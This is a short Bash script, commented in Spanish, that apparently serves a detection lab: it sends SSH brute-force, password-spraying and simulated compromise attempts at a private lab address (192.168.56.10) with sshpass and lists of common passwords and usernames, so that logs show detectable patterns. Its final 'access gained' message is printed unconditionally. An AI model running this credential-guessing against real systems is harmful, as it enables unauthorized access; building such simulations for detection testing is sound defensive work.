#!/bin/bash
# attack.sh - Simulación de ataque de acceso no autorizado
# Genera tres patrones detectables: fuerza bruta, password spraying y compromiso

TARGET="192.168.56.10"
SSH_OPTS="-o StrictHostKeyChecking=no -o ConnectTimeout=3 -o PreferredAuthentications=password -o PubkeyAuthentication=no"

echo "===================================================="
echo "  SIMULACION DE ATAQUE DE ACCESO NO AUTORIZADO"
echo "  Objetivo: $TARGET"
echo "===================================================="

echo ""
echo "[FASE 1] Ataque de fuerza bruta contra 'admin'..."
echo "         (10 intentos con contrasenas comunes)"
PASSWORDS=("123456" "password" "admin" "qwerty" "letmein" "welcome" "password1" "12345678" "abc123" "monkey")
for pass in "${PASSWORDS[@]}"; do
    sshpass -p "$pass" ssh $SSH_OPTS admin@$TARGET "exit" 2>/dev/null
    echo "  - Intento con contrasena: $pass"
    sleep 0.5
done

echo ""
echo "[FASE 2] Password spraying con 'Spring2026!'..."
echo "         (1 contrasena contra 8 usuarios distintos)"
USERS=("administrator" "root" "user1" "user2" "test" "guest" "backup" "operator")
for u in "${USERS[@]}"; do
    sshpass -p "Spring2026!" ssh $SSH_OPTS $u@$TARGET "exit" 2>/dev/null
    echo "  - Intento contra usuario: $u"
    sleep 0.5
done

echo ""
echo "[FASE 3] Intento de compromiso de 'admin'..."
echo "         (5 fallos seguidos del exito)"
WRONG=("dragon" "master" "qwerty123" "iloveyou" "trustno1")
for pass in "${WRONG[@]}"; do
    sshpass -p "$pass" ssh $SSH_OPTS admin@$TARGET "exit" 2>/dev/null
    echo "  - Intento fallido con: $pass"
    sleep 0.5
done

echo "  - Probando con 'Passw0rd!' "
sshpass -p "Passw0rd!" ssh $SSH_OPTS admin@$TARGET "exit" 2>/dev/null
echo "  - Acceso conseguido."

echo ""
echo "===================================================="
echo "  ATAQUE FINALIZADO"
echo "===================================================="
EOF